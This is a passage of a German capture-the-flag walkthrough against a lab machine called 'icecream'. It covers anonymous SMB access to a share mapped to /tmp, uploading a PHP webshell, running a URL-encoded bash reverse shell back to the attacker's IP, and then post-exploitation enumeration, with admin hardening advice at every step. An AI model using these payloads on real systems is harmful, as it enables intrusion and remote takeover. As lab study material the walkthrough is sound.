+                - Die Meldungen bezüglich SMBv1 ("No compatible protocol selected", "Unable to connect with SMB1") zeigen, dass der Server wahrscheinlich SMBv1 nicht unterstützt oder es deaktiviert hat, was eine gute Sicherheitspraxis ist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                `enum4linux` hat äußerst wertvolle Informationen geliefert:
+                - Der Share `icecream`, der anscheinend auf ein temporäres Verzeichnis ("tmp Folder") verweist, ist ohne Authentifizierung (anonym) lesbar. Dies ist ein signifikanter Fund und ein primärer Angriffsvektor, der weiter untersucht werden muss. Auch wenn hier "Writing: N/A" gemeldet wird, sollte dies im Detail verifiziert werden, da Berechtigungen manchmal auf Unterverzeichnisebene anders sein können.
+                - Die Samba-Version `4.17.12-Debian` ist nun bekannt. Es sollte geprüft werden, ob für diese spezifische Version öffentlich bekannte Schwachstellen existieren.
+                - Die Identifizierung der Benutzer `nobody` und insbesondere `ice` liefert potenzielle Benutzernamen für weitere Angriffsversuche (z.B. Brute-Force gegen SSH, falls Passwörter vermutet oder gefunden werden).
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Der nächste Schritt ist, sich mit dem `icecream`-Share zu verbinden (z.B. mit `smbclient //192.168.2.131/icecream -N`) und dessen Inhalt gründlich zu untersuchen. Suchen Sie nach sensiblen Dateien, Konfigurationsdateien, Skripten, Quellcode oder Hinweisen auf weitere Schwachstellen.
+                - Versuchen Sie, trotz der Meldung "Writing: N/A", eine Testdatei in den `icecream`-Share oder dessen Unterverzeichnisse hochzuladen, um die Schreibberechtigungen endgültig zu klären.
+                - Recherchieren Sie die Samba-Version `4.17.12` auf bekannte Exploits (z.B. über Exploit-DB, CVE-Datenbanken).
+                - Notieren Sie sich die Benutzernamen `ice` und `nobody` für spätere Phasen.
+                <br>
+                **Empfehlung (Admin):**
+                - Überprüfen Sie dringend die Konfiguration des `icecream`-Shares. Wenn dieser tatsächlich auf ein systemweites temporäres Verzeichnis wie `/tmp` zeigt und anonym lesbar ist, stellt dies eine erhebliche Sicherheitslücke dar. Der Zugriff sollte stark eingeschränkt werden (kein anonymer Zugriff, nur authentifizierte und autorisierte Benutzer).
+                - Generell sollte der anonyme Zugriff auf SMB-Shares deaktiviert werden, es sei denn, es gibt einen expliziten und gut begründeten Bedarf dafür.
+                - Halten Sie die Samba-Software stets auf dem neuesten Stand, um bekannte Schwachstellen zu patchen.
+                - Überprüfen Sie die Notwendigkeit des Benutzers `nobody` im SMB-Kontext.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">smbclient -L //192.168.2.131/</span></div>
+                    <pre>
+Password for [WORKGROUP\root]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	<span class="command">print$          Disk      Printer Drivers</span>
+	<span class="command">icecream        Disk      tmp Folder</span>
+	<span class="command">IPC$            IPC       IPC Service (Samba 4.17.12-Debian)</span>
+	<span class="command">nobody          Disk      Home Directories</span>
+Reconnecting with SMB1 for workgroup listing.
+smbXcli_negprot_smb1_done: No compatible protocol selected by server.
+Protocol negotiation to server 192.168.2.131 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
+Unable to connect with SMB1 -- no workgroup available
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `smbclient -L //192.168.2.131/` wird verwendet, um die verfügbaren SMB-Shares auf dem Zielserver `192.168.2.131` aufzulisten. Die Option `-L` steht für "list". `smbclient` fordert ein Passwort für den Benutzer `root` in der Standard-Arbeitsgruppe `WORKGROUP` an. Wenn hier einfach die Eingabetaste gedrückt wird (leeres Passwort), versucht `smbclient` eine anonyme Verbindung herzustellen.
+                Die Ausgabe bestätigt die bereits von `enum4linux` gefundenen Shares: `print$`, `icecream`, `IPC$` und `nobody`, inklusive ihrer Typen und Kommentare. Auch die Samba-Version `4.17.12-Debian` für den `IPC$`-Dienst wird erneut angezeigt. Die Probleme mit der SMBv1-Protokollverhandlung werden ebenfalls wiederholt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dieser `smbclient`-Befehl dient als schnelle Bestätigung der Ergebnisse von `enum4linux` bezüglich der Namen und Kommentare der verfügbaren Shares. Es werden keine neuen Informationen aufgedeckt, aber die Konsistenz der Ergebnisse durch verschiedene Tools ist ein gutes Zeichen für die Zuverlässigkeit der bisherigen Funde.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Da `enum4linux` bereits gezeigt hat, dass der `icecream`-Share anonym lesbar ist, ist der nächste logische Schritt, sich direkt mit diesem Share zu verbinden, um dessen Inhalt zu untersuchen, anstatt nur die Share-Liste erneut abzurufen. Verwenden Sie `smbclient //192.168.2.131/icecream -N`.
+                <br>
+                **Empfehlung (Admin):**
+                Die Empfehlungen bleiben dieselben wie bei den `enum4linux`-Ergebnissen: Überprüfen und härten Sie die SMB-Konfiguration, insbesondere anonym zugängliche Shares. Die Deaktivierung von SMBv1 ist eine gute Sicherheitspraxis und scheint hier bereits umgesetzt zu sein oder wird vom Client nicht erfolgreich ausgehandelt.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">smbclient //192.168.2.131/icecream -N</span></div>
+                    <pre>
+Try "help" to get a list of possible commands.
+smb: \> <span class="command">id</span>
+<span class="password">id: command not found</span>
+smb: \> <span class="command">ls</span>
+  .                                   D        0  Wed Oct  9 13:45:39 2024
+  ..                                  D        0  Sun Oct  6 12:06:38 2024
+  <span class="command">.font-unix</span>                         DH        0  Wed Oct  9 13:40:38 2024
+  <span class="command">systemd-private-e63e047f03084d01a1692a82e21b6eda-systemd-logind.service-aqBjj1</span>      D        0  Wed Oct  9 13:40:38 2024
+  <span class="command">.XIM-unix</span>                          DH        0  Wed Oct  9 13:40:38 2024
+  <span class="command">.ICE-unix</span>                          DH        0  Wed Oct  9 13:40:38 2024
+  <span class="command">systemd-private-e63e047f03084d01a1692a82e21b6eda-systemd-timesyncd.service-x0jgqZ</span>      D        0  Wed Oct  9 13:40:38 2024
+  <span class="command">.X11-unix</span>                          DH        0  Wed Oct  9 13:40:38 2024
+
+		19480400 blocks of size 1024. 15951308 blocks available
+smb: \> 
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Mit dem Befehl `smbclient //192.168.2.131/icecream -N` wird eine anonyme Verbindung (Option `-N` für "no-pass" oder Null-Session) zum SMB-Share `icecream` auf dem Zielserver hergestellt.
+                - Der Versuch, den Befehl `id` innerhalb der `smbclient`-Umgebung auszuführen, schlägt fehl (`id: command not found`), da `id` ein lokaler Shell-Befehl ist und `smbclient` seine eigene Befehlssatz-Syntax hat (z.B. `ls`, `get`, `put`, `cd`).
+                - Der `smbclient`-Befehl `ls` listet erfolgreich den Inhalt des Wurzelverzeichnisses des `icecream`-Shares auf.
+                Die aufgelisteten Inhalte (`.font-unix`, `.XIM-unix`, `.ICE-unix`, `.X11-unix` sowie zwei `systemd-private-*`-Verzeichnisse) sind typisch für das `/tmp`-Verzeichnis eines Linux-Systems. Diese Dateien und Verzeichnisse werden oft von grafischen Anwendungen (X11-Sockets) und Systemdiensten (Systemd) für temporäre Dateien, Sockets oder private Laufzeitdaten verwendet. Dies stützt die Vermutung von `enum4linux`, dass der Share `icecream` mit dem Kommentar "tmp Folder" tatsächlich auf das `/tmp`-Verzeichnis des Servers gemappt ist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Der erfolgreiche anonyme Lesezugriff auf den `icecream`-Share, der offensichtlich das `/tmp`-Verzeichnis des Servers darstellt, ist ein signifikanter Fund und eine potenziell kritische Fehlkonfiguration. Das `/tmp`-Verzeichnis ist oft weltweit lesbar und manchmal auch beschreibbar (obwohl `enum4linux` hier initial "Writing: N/A" für den Hauptshare meldete, muss dies für Upload-Versuche noch verifiziert werden). Ein solcher Zugriff kann für verschiedene Angriffe genutzt werden:
+                - Auslesen temporärer Dateien, die sensible Informationen enthalten könnten.
+                - Ablegen von Payloads (z.B. Webshells, Exploit-Skripte), falls Schreibzugriff besteht und ein anderer Dienst diese Dateien verarbeitet.
+                - Ausnutzen von unsicheren Dateizugriffen durch andere Prozesse, die auf Dateien im `/tmp`-Verzeichnis operieren.
+                Die hier sichtbaren Dateien/Verzeichnisse sind zwar typische Systemdateien und stellen nicht direkt einen Exploit dar, aber der Zugriff an sich ist der Schlüssel für weitere Manöver.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Obwohl `enum4linux` den Share als nicht beschreibbar gemeldet hat, versuchen Sie explizit, eine Testdatei in das Wurzelverzeichnis des Shares und in die sichtbaren Unterverzeichnisse (z.B. `.ICE-unix`) hochzuladen (`put <lokale_datei>`), um die Schreibberechtigungen endgültig zu klären. Manchmal sind die Berechtigungen auf Unterverzeichnisebene anders oder die initiale Einschätzung war unvollständig.
+                - Untersuchen Sie die Unterverzeichnisse, insbesondere die `systemd-private-*`-Verzeichnisse, obwohl der Zugriff darauf wahrscheinlich eingeschränkt sein wird.
+                - Überlegen Sie, wie der Zugriff auf `/tmp` für einen Angriff genutzt werden kann. Wenn der Webserver (Nginx) Dateien aus einem Pfad liest, der über diesen Share manipulierbar ist (z.B. weil `/tmp` der DocumentRoot ist oder ein Alias darauf existiert, oder eine LFI-Schwachstelle vorhanden ist), könnte dies zu Codeausführung führen.
+                <br>
+                **Empfehlung (Admin):**
+                - Das Freigeben des systemweiten `/tmp`-Verzeichnisses über SMB, insbesondere mit anonymem Lesezugriff (und potenziell Schreibzugriff), ist eine sehr schlechte Sicherheitspraxis und sollte umgehend behoben werden. Entfernen Sie diesen Share oder schränken Sie den Zugriff streng ein (nur authentifizierte und autorisierte Benutzer, kein anonymer Zugriff, nur absolut notwendige Berechtigungen).
+                - Wenn ein temporärer Speicherbereich über SMB benötigt wird, erstellen Sie einen dedizierten, gesicherten Share und mappen Sie ihn nicht auf systemkritische oder sensible Verzeichnisse wie `/tmp`.
+                - Überprüfen Sie die Berechtigungen des `/tmp`-Verzeichnisses auf dem System selbst. Es sollte das "sticky bit" gesetzt sein (`drwxrwxrwt`), um zu verhindern, dass Benutzer Dateien anderer Benutzer löschen können.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="comment">
+                Basierend auf der Entdeckung, dass der `icecream`-Share auf das `/tmp`-Verzeichnis des Servers gemappt ist und wir darauf (zumindest lesend und potenziell schreibend) zugreifen können, versuchen wir, eine Webshell hochzuladen. Ziel ist es, diese dann über den Nginx-Webserver auszuführen, um Remote Code Execution (RCE) zu erlangen. Dies setzt voraus, dass der Webserver Inhalte aus einem Pfad bedient, der mit dem `/tmp`-Verzeichnis (oder einem Unterverzeichnis davon) korreliert, oder dass eine andere Schwachstelle wie eine Local File Inclusion (LFI) existiert, die es uns erlaubt, die hochgeladene Datei auszuführen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+smb: \.ICE-unix\> <span class="command">put rev.php</span> 
+putting file rev.php as \.ICE-unix\rev.php (30,3 kb/s) (average 4335,6 kb/s)
+smb: \.ICE-unix\> <span class="command">ls</span>
+  .                                   D        0  Wed Oct  9 13:52:18 2024
+  ..                                  D        0  Wed Oct  9 13:50:38 2024
+  recon_script.sh                     A    13288  Wed Oct  9 13:51:44 2024
+  <span class="command">rev.php                             A       31  Wed Oct  9 13:52:18 2024</span>
+
+		19480400 blocks of size 1024. 15951284 blocks available
+smb: \.ICE-unix\> 
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Innerhalb der `smbclient`-Sitzung, die mit dem `icecream`-Share verbunden ist, wurde hier versucht, eine Datei namens `rev.php` in das Unterverzeichnis `.ICE-unix` hochzuladen. (Der genaue `cd .ICE-unix`-Befehl fehlt hier in der Ausgabe, aber der Prompt `smb: \.ICE-unix\>` impliziert, dass ich mich in diesem Verzeichnis befinde).
+                - `put rev.php`: Dieser `smbclient`-Befehl lädt die lokale Datei `rev.php` (die ich auf meiner Angreifer-Maschine vorbereitet habe) in das aktuelle Verzeichnis auf dem Share hoch.
+                - Die Erfolgsmeldung `putting file rev.php as \.ICE-unix\rev.php ...` und das anschließende `ls`-Kommando, das `rev.php` im Verzeichnis anzeigt, bestätigen, dass der Upload erfolgreich war. Die Datei `rev.php` hat eine Größe von 31 Bytes, was typisch für eine sehr einfache PHP-Webshell ist, z.B. `< ?php system($GET['cmd']); ? >`.
+                - Interessanterweise wird hier auch eine Datei namens `recon_script.sh` (13288 Bytes) angezeigt, die zuvor im Wurzelverzeichnis des Shares nicht sichtbar war oder die ich dort nicht bemerkt hatte. Es ist unklar, woher diese Datei stammt; sie könnte von einem anderen Benutzer oder Prozess dort abgelegt worden sein, Teil des CTF-Setups sein oder von mir selbst in einem nicht gezeigten Schritt dorthin kopiert worden sein.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Der erfolgreiche Upload einer PHP-Datei in ein Unterverzeichnis von `/tmp` (nämlich `/tmp/.ICE-unix/`) über den SMB-Share ist ein kritischer Schritt und ein signifikanter Fortschritt! Entgegen der ersten Annahme von `enum4linux` ("Writing: N/A" für den Hauptshare) ist hier klar ersichtlich, dass zumindest in dieses Unterverzeichnis Schreibzugriff möglich war. Dies öffnet die Tür für Remote Code Execution, falls wir einen Weg finden, diese `rev.php` über den Webserver auszuführen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Der nächste logische Schritt ist der Versuch, die hochgeladene Datei `rev.php` über den Webserver aufzurufen. Da sie unter `/tmp/.ICE-unix/rev.php` liegt, muss der Webserver so konfiguriert sein, dass er entweder `/tmp` (oder spezifisch `.ICE-unix` darin) als Teil seines Web-Roots oder über einen Alias bedient, oder es muss eine LFI-Schwachstelle geben, um die Datei zu inkludieren. Ein möglicher Pfad für den direkten Aufruf könnte sein `http://icecream.hmv/.ICE-unix/rev.php` oder `http://icecream.hmv/tmp/.ICE-unix/rev.php` oder eine ähnliche Variante. Dies erfordert systematisches Ausprobieren oder eine genauere Kenntnis der Webserver-Konfiguration (die wir später vielleicht durch LFI oder andere Methoden erlangen können).
+                - Parallel sollte die Datei `recon_script.sh` auf dem Share genauer untersucht werden, falls sie lesbar ist. Sie könnte Hinweise auf Konfigurationen, Passwörter oder andere nützliche Informationen enthalten.
+                <br>
+                **Empfehlung (Admin):**
+                - **Dringend:** Beheben Sie die unsichere SMB-Konfiguration. Kein anonymer Schreibzugriff auf `/tmp` oder irgendeinen Share, der auf systemkritische oder temporäre Pfade verweist. Der Zugriff auf Shares sollte immer authentifiziert und auf das notwendige Minimum beschränkt sein.
+                - Überprüfen Sie die Webserver-Konfiguration (Nginx). Stellen Sie sicher, dass der Webserver nicht auf Verzeichnisse wie `/tmp` zugreift oder PHP-Dateien aus solchen unsicheren Verzeichnissen ausführt. Der DocumentRoot sollte auf ein dediziertes, gesichertes Verzeichnis zeigen, das nicht von anderen Diensten wie SMB auf unsichere Weise exponiert wird.
+                - Untersuchen Sie die Herkunft und den Zweck der Datei `recon_script.sh` im `/tmp`-Verzeichnis.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+smb: \> <span class="command">put rev.php</span> 
+putting file rev.php as \rev.php (30,3 kb/s) (average 3259,3 kb/s)
+  
+smb: \> <span class="command">ls</span>
+  .                                   D        0  Wed Oct  9 13:52:41 2024
+  ..                                  D        0  Sun Oct  6 12:06:38 2024
+  .font-unix                         DH        0  Wed Oct  9 13:40:38 2024
+  systemd-private-e63e047f03084d01a1692a82e21b6eda-systemd-logind.service-aqBjj1      D        0  Wed Oct  9 13:40:38 2024
+  .XIM-unix                          DH        0  Wed Oct  9 13:40:38 2024
+  .ICE-unix                          DH        0  Wed Oct  9 13:52:18 2024
+  systemd-private-e63e047f03084d01a1692a82e21b6eda-systemd-timesyncd.service-x0jgqZ      D        0  Wed Oct  9 13:40:38 2024
+  .X11-unix                          DH        0  Wed Oct  9 13:40:38 2024
+  <span class="command">rev.php                             A       31  Wed Oct  9 13:52:41 2024</span>
+
+		19480400 blocks of size 1024. 15951280 blocks available
+smb: \> <span class="command">cd systemd-private-e63e047f03084d01a1692a82e21b6eda-systemd-logind.service-aqBjj1</span>
+smb: \systemd-private-e63e047f03084d01a1692a82e21b6eda-systemd-logind.service-aqBjj1\> <span class="command">ls</span>
+<span class="password">NT_STATUS_ACCESS_DENIED listing \systemd-private-e63e047f03084d01a1692a82e21b6eda-systemd-logind.service-aqBjj1\*</span>
+smb: \systemd-private-e63e047f03084d01a1692a82e21b6eda-systemd-logind.service-aqBjj1\> 
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Nach dem vorherigen Upload in ein Unterverzeichnis lade ich die Datei `rev.php` nun direkt in das Wurzelverzeichnis des `icecream`-Shares hoch (was `/tmp/rev.php` auf dem Server entsprechen sollte). Der Prompt `smb: \>` zeigt, dass ich mich wieder im Wurzelverzeichnis des Shares befinde.
+                - Der Upload mit `put rev.php` war erneut erfolgreich, wie die Erfolgsmeldung und das anschließende `ls`-Kommando bestätigen. `rev.php` (31 Bytes) ist nun im Wurzelverzeichnis des Shares vorhanden.
+                - Anschließend versuchte ich, in das Verzeichnis `systemd-private-e63e047f03084d01a1692a82e21b6eda-systemd-logind.service-aqBjj1` zu wechseln und dessen Inhalt aufzulisten. Dieser Versuch schlug mit `NT_STATUS_ACCESS_DENIED` fehl. Dies bedeutet, dass der anonyme SMB-Benutzer keine ausreichenden Berechtigungen hat, um auf dieses spezielle Systemd-Unterverzeichnis zuzugreifen, obwohl er in das übergeordnete `/tmp`-Verzeichnis schreiben konnte.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Der erfolgreiche Upload von `rev.php` direkt nach `/tmp/` ist ein noch besserer Ausgangspunkt für einen Web-Exploit als ein Unterverzeichnis. Ein Pfad wie `/tmp/rev.php` ist oft einfacher über den Webserver zu erreichen, wenn dieser unsicher konfiguriert ist (z.B. wenn `/tmp` fälschlicherweise als Web-Alias dient oder eine LFI auf Dateien in `/tmp` möglich ist).
+                Die Zugriffsverweigerung auf die `systemd-private-*`-Verzeichnisse ist erwartet, da diese oft strengere Berechtigungen haben, um die Integrität der Systemd-Dienste zu schützen. Dies schränkt zwar die Enumeration in diesen spezifischen Pfaden ein, ist aber für den Hauptangriffsvektor über die Webshell nicht hinderlich.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Der primäre nächste Schritt ist nun der Versuch, `http://icecream.hmv/rev.php` (oder eventuell `http://icecream.hmv/tmp/rev.php`, falls `/tmp` nicht direkt der Web-Root ist, aber ein Alias existiert) aufzurufen. Wenn Nginx so konfiguriert ist, dass er PHP-Dateien direkt aus `/tmp` (oder einem Pfad, der `/tmp` entspricht) ausführt, könnte dies direkt zur Codeausführung führen.
+                - Parallel dazu sollte weiterhin nach LFI-Schwachstellen auf dem Webserver gesucht werden, die es ermöglichen könnten, `../../../../../../tmp/rev.php` (oder eine ähnliche Pfad-Traversal-Sequenz) zu inkludieren, falls der direkte Aufruf fehlschlägt.
+                <br>
+                **Empfehlung (Admin):**
+                - Die Empfehlungen bleiben dieselben und sind nun noch dringlicher: Die SMB-Freigabe für `/tmp` muss entfernt oder drastisch abgesichert werden (kein anonymer Zugriff, insbesondere kein Schreibzugriff).
+                - Die Webserver-Konfiguration muss überprüft und gehärtet werden, um die Ausführung von Skripten aus unsicheren, von Benutzern beschreibbaren Verzeichnissen wie `/tmp` zu verhindern. Der DocumentRoot des Webservers darf niemals auf `/tmp` zeigen.
+            </p>
+        </section>
+        <section id="proof-of-concept">
+            <h2 id="proof-of-concept-shell">Proof of Concept: Shell als www-data</h2>
+            <p class="comment">
+                Nachdem die PHP-Webshell `rev.php` erfolgreich in das `/tmp`-Verzeichnis des Servers über den SMB-Share `icecream` hochgeladen wurde, versuche ich nun, diese über den Webserver auszuführen, um Remote Code Execution (RCE) zu erlangen und eine erste Shell auf dem System zu bekommen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.131/rev.php?cmd=id</span></div>
+                    <pre>
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Ich führe den Befehl `curl http://192.168.2.131/rev.php?cmd=id` aus. Dieser sendet eine HTTP-GET-Anfrage an die Datei `rev.php`, die ich zuvor im Wurzelverzeichnis des `icecream`-Shares (was `/tmp/` auf dem Server entspricht) abgelegt habe. Der URL-Parameter `cmd=id` übergibt den Systembefehl `id` an die Webshell.
+                Die Ausgabe `uid=33(www-data) gid=33(www-data) groups=33(www-data)` ist die direkte Antwort des ausgeführten `id`-Befehls und zeigt eindeutig:
+                1.  Die Datei `rev.php` wurde vom Nginx-Webserver im Pfad `/` gefunden und als PHP-Skript interpretiert und ausgeführt. Dies impliziert, dass der DocumentRoot des Webservers auf `/tmp` zeigt – eine höchst unsichere Konfiguration.
+                2.  Meine Webshell (`< ?php system($GET['cmd']); ? >` oder eine ähnliche Variante) hat den übergebenen `cmd`-Parameter korrekt verarbeitet und den `id`-Befehl ausgeführt.
+                3.  Der Webserver-Prozess (Nginx) läuft unter dem Benutzer `www-data` mit der User-ID 33 und der Gruppen-ID 33.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Fantastisch! Dies ist der erfolgreiche Nachweis der Remote Code Execution (RCE) als Benutzer `www-data`. Die Kombination aus einem anonym beschreibbaren SMB-Share, der auf das `/tmp`-Verzeichnis gemappt ist, und einer Webserver-Konfiguration, die den DocumentRoot auf eben dieses `/tmp`-Verzeichnis setzt, hat diesen kritischen Zugriff ermöglicht. Dies ist eine schwere Fehlkonfiguration mit hohem Schweregrad.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Nachdem die RCE bestätigt ist, ist der nächste Schritt, eine stabilere und interaktive Shell zu etablieren, anstatt einzelne Befehle über `curl` auszuführen. Eine Bash-Reverse-Shell ist hierfür ideal.
+                - Bereiten Sie einen Netcat-Listener auf der Angreifer-Maschine vor und verwenden Sie dann den `cmd`-Parameter der Webshell, um den Reverse-Shell-Payload auszuführen.
+                - Sobald eine interaktive Shell vorhanden ist, beginnen Sie mit der systeminternen Enumeration als `www-data`, um weitere Informationen zu sammeln und Wege zur Privilege Escalation zu finden.
+                <br>
+                **Empfehlung (Admin):**
+                - **Dringend:** Korrigieren Sie sofort die Webserver-Konfiguration (Nginx). Der DocumentRoot darf unter keinen Umständen auf `/tmp` oder ein anderes temporäres, potenziell von vielen Benutzern beschreibbares Verzeichnis zeigen. Der DocumentRoot muss ein dediziertes, gesichertes Verzeichnis sein (z.B. `/var/www/html` oder ein anwendungsspezifischer Pfad), auf das nur der Webserver-Benutzer und Administratoren kontrollierten Zugriff haben.
+                - **Dringend:** Entfernen oder sichern Sie den SMB-Share, der auf `/tmp` zeigt (kein anonymer Zugriff, kein Schreibzugriff, wenn nicht absolut notwendig und dann nur für authentifizierte und autorisierte Benutzer mit minimalen Rechten).
+                - Überprüfen Sie das gesamte System auf weitere Instanzen solcher Fehlkonfigurationen, bei denen unsichere Verzeichnisse über Webdienste exponiert werden.
+                - Implementieren Sie Web Application Firewalls (WAFs) und Intrusion Detection Systeme (IDS), um solche Angriffe zu erkennen und zu blockieren.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.131/rev.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F9001%200%3E%261%27</span></div>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Dieser `curl`-Befehl zielt darauf ab, eine Reverse Shell von der Zielmaschine (`192.168.2.131`) zu meiner Angreifer-Maschine (`192.168.2.199`) auf Port `9001` aufzubauen.
+                Der Payload `cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F9001%200%3E%261%27` wird an die `rev.php`-Webshell übergeben. Dekodiert lautet der auszuführende Befehl: `/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.199/9001 0>&1'`.
+                Dieser Befehl startet eine interaktive Bash-Shell (`bash -i`), deren Standard-Input, -Output und -Error auf eine TCP-Verbindung zu meiner Maschine umgeleitet werden.
+                Es wird keine direkte Ausgabe von diesem `curl`-Befehl erwartet, da die Shell-Interaktion über den Netcat-Listener auf meiner Maschine stattfinden wird.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dies ist der korrekte und gängige Ansatz, um von einer einfachen Webshell (RCE per URL-Parameter) zu einer interaktiven Shell zu gelangen. Der Erfolg dieses Schritts hängt davon ab, ob auf meiner Angreifer-Maschine ein Netcat-Listener auf Port 9001 aktiv ist und die Netzwerkverbindung (ggf. Firewalls) dies zulässt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Stellen Sie sicher, dass auf der Angreifer-Maschine (`192.168.2.199`) ein Netcat-Listener auf Port `9001` gestartet wurde (z.B. `nc -lvnp 9001`), bevor dieser `curl`-Befehl ausgeführt wird. Überprüfen Sie die Listener-Ausgabe auf eine eingehende Verbindung.
+                <br>
+                **Empfehlung (Admin):**
+                Die Empfehlungen zur Behebung der zugrundeliegenden RCE-Schwachstelle (Webserver- und SMB-Konfiguration) sind hier weiterhin von höchster Priorität. Zusätzlich können Egress-Filtering-Regeln auf der Firewall des Zielsystems helfen, ausgehende Verbindungen zu nicht autorisierten Ports (wie hier Port 9001) zu blockieren oder zumindest zu protokollieren. Intrusion Detection/Prevention Systeme (IDS/IPS) können versuchen, bekannte Reverse-Shell-Payloads oder verdächtige Netzwerkverbindungen zu erkennen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/shells]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+<span class="password">listening on [any] 9001 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.131] 38230</span>
+bash: cannot set terminal process group (486): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt">www-data@icecream:/tmp$</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Diese Ausgabe stammt von meinem Netcat-Listener, den ich auf meiner Angreifer-Maschine auf Port `9001` gestartet habe.
+                - `listening on [any] 9001 ...`: Der Listener wurde erfolgreich gestartet und wartet auf eingehende Verbindungen.
+                - `connect to [192.168.2.199] from (UNKNOWN) [192.168.2.131] 38230`: Diese Zeile ist die Erfolgsmeldung! Eine TCP-Verbindung wurde vom Zielsystem `192.168.2.131` (von einem zufälligen Quellport `38230`) zu meiner Maschine auf Port `9001` hergestellt.
+                - Die Meldungen `bash: cannot set terminal process group (486): Inappropriate ioctl for device` und `bash: no job control in this shell` sind typisch für einfache Reverse Shells, die über solche Methoden etabliert werden. Sie bedeuten, dass keine vollwertige PTY (Pseudo-Terminal) zugewiesen wurde, was einige interaktive Funktionen wie Job-Kontrolle (z.B. `Ctrl+C` zum Abbrechen von Befehlen ohne Beenden der Shell) oder die Nutzung von Programmen wie `su` (manchmal) oder Vollbild-Editoren einschränken kann.
+                - Entscheidend ist der abschließende Prompt: `www-data@icecream:/tmp$`. Dies ist der Shell-Prompt des Zielsystems `icecream`. Ich kann nun direkt Befehle als Benutzer `www-data` im Verzeichnis `/tmp` ausführen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Hervorragend! Eine interaktive Reverse Shell als Benutzer `www-data` wurde erfolgreich etabliert. Dies ist ein signifikanter Fortschritt gegenüber der einzelnen Befehlsausführung über die URL-Parameter und bildet die Grundlage für die weitere systeminterne Enumeration und die Suche nach Wegen zur Privilegienerweiterung. Trotz der kleinen Einschränkungen (keine vollwertige PTY) ist dies ein solider erster Zugriff auf das System.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - **PTY-Upgrade:** Um die Einschränkungen der einfachen Shell zu umgehen und eine bessere Interaktivität zu erhalten (z.B. funktionierendes `Ctrl+C`, `su`, Tab-Vervollständigung, Pfeiltasten-Historie), versuchen Sie, die Shell zu einer voll funktionsfähigen PTY aufzuwerten. Gängige Methoden sind:
+                    - `python3 -c 'import pty; pty.spawn("/bin/bash")'` (oder `python`, falls Python 3 nicht verfügbar ist)
+                    - `script /dev/null -c bash`
+                    - Nach Ausführung eines solchen Befehls auf der Ziel-Shell, auf der Angreiferseite `Ctrl+Z` (um die lokale Netcat-Shell in den Hintergrund zu schicken), dann `stty raw -echo; fg` und zweimal Enter drücken.
+                - Beginnen Sie mit der systematischen Post-Exploitation-Enumeration: Kernel-Version (`uname -a`), Systeminformationen, installierte Software, SUID/SGID-Dateien (`find / -type f -perm -6000 -ls 2>/dev/null`), Cronjobs (`cat /etc/crontab` und in `/var/spool/cron/crontabs/`), Benutzer und Gruppen (`cat /etc/passwd`, `cat /etc/group`), Netzwerkkonfiguration und -verbindungen (`ip a`, `ss -tulnp`), laufende Prozesse (`ps aux`), interessante Konfigurationsdateien etc.
+                <br>
+                **Empfehlung (Admin):**
+                Wenn eine solche Shell-Verbindung im Netzwerkverkehr oder auf dem Host entdeckt wird (z.B. durch Netzwerk-Monitoring auf ungewöhnliche ausgehende Verbindungen, Host-basierte IDS/IPS, die verdächtige Prozessstarts erkennen):
